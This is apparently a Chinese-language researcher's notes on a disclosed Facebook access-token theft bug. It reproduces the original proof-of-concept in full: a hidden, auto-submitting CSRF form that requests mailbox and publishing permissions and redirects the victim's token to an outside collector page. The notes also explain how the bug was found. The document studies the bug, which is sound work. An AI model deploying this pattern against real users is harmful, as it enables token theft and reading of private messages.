# 漏洞散记
##  记录一个token窃取
> Facebook的一个token窃取，说实话，这个漏洞看的我很迷，甚至在写分析的时候我都还没搞清楚到底是什么一个情况，准确的说到底是如何去利用，能达成什么效果，就看能不能在分析的时候灵光一闪了

> 漏洞价值:未知

> 源漏洞:[steal token](https://whitton.io/articles/stealing-facebook-access-tokens-with-a-double-submit/)

# 灵光真的闪了
确实灵光闪了，仿佛知道了漏洞的具体情况，为了不让自己的火花消失掉，所以这章可能会写的很乱

## 先说利用
作者写了一套POC，记住是一套，虽然作者只放出其中一份代码出来
```
<!-- index.html -->
<html>
    <head></head>
    <body>
        <h3>Facebook Auth PoC - Wait 5 Seconds</h3>
        <!-- Load the form first -->
        <div id="iframe-wrap">
            <iframe src="frame.html" style="visibility:hidden;"></iframe>
        </div>
        <!-- Load the second after 5 seconds -->
        <script>
            setTimeout(function(){
                document.getElementById('iframe-wrap').innerHTML = '<iframe src="frame.html" style="width:800px;height:500px;"></iframe>';
            }, 5000);
        </script>
    </body>
</html>

<!-- frame.html -->
<form action="https://www.facebook.com/connect/uiserver.php" method="POST" id="fb">
    <input type="hidden" name="perms" value="email,user_likes,publish_actions,read_mailbox">
    <input type="hidden" name="dubstep" value="1">
    <input type="hidden" name="new_user_session" value="1">
    <input type="hidden" name="app_id" value="359849714135684">
    <input type="hidden" name="redirect_uri" value="https://fin1te.net/fb-poc/fb.php">
    <input type="hidden" name="response_type" value="code">
    <input type="hidden" name="from_post" value="1">
    <input type="hidden" name="__uiserv_method" value="permissions.request">    
    <input type="hidden" name="grant_clicked" value="Visit Website">
</form>
<script>document.getElementById('fb').submit();</script>
```
一开始我看球不懂，想不通这个html能干嘛，后来看到这个**location**
![1](https://whitton.io/images/facebookauth/facebook-auth-3-1.png)

才知道，原来还有个fb.php配合，虽然没有放出具体的代码，但是个人觉得应该就是个对于token的利用

然后在index.html的框里展示出来

## 利用
利用怎么利用？？这个**index.html**发给**victim**，然后**victim**访问会会向**fb.php**发送**access_token**，接着会处理这个**token**然后展示出**victim**的部分FB的**inbox**信息

## 漏洞挖掘
终于一口气憋完了，这时候重新想作者如何挖掘的漏洞，才是感觉到作者的强大之处，简直太强了

先说漏洞处本身应该具有的功能

首先用户登录进fb，然后会看到有内置的app链接，用户可以点击**view**然后跳转到app的site

![2](https://whitton.io/images/facebookauth/facebook-auth-1-1.png)

### 步步深思

作者首先注意到，这个**Form**居然不存在权限对话框，那么其访问权限就是应该完全由用户本身生成的，然后因为CSRF_token所以基本能确定这个可能性

> 这一步就要开始说，这个很值得深思，原本的漏洞挖掘根本不会在意这些，但是这一次就感觉到，这仿佛是一个很重要的引子

接着作者尝试删除requests的CSRF_token，然后传回了500的错误，作者说这个在预料内

```
This is expected behaviour.
```
但是漏洞最关键的一步发生了，就是虽然是500，但是后端还是生成了一个**access_token**，作者刷新了页面也就是重新回到了图二的页面，将鼠标悬浮在**Visit Website**这个**button**上时，也能够发现**access_token**

![3](https://whitton.io/images/facebookauth/facebook-auth-2.png)

>我的天，这让我突然想起来一件事，就是以前做测试时，好像数次遇到了这种情况，但是都因为500而放弃继续深入测试下去了，这一次突然让我想起来，尼玛之前的几个server不会也有token窃取吧

后续实际就可以不说了，毕竟**access_token**都到手了，还要说什么呢

# 结语

写的很仓促，一个是因为确实看了很久，想出具体的经过很费时，二就是此时的我正在刷《好想告诉你》，一个不错的番，确实不错

总结一下这次漏洞挖掘，看起来很简单，但是从发现到利用，个人感觉，担得上**处处精彩**这四个字,毕竟个人也是做这行的工作，能发现并且利用确实存在相当的难度，所一十分精彩，值得细细深思，一个500后往往都不会再在意什么，但是偏偏却能发现到多出了一个access_token，还有刚开始的那个，凭借没有发现认证就能判断具体的权限功能，这是值得回味的细节，个人感觉，这个应该是长久测试所积累起来的感觉与经验
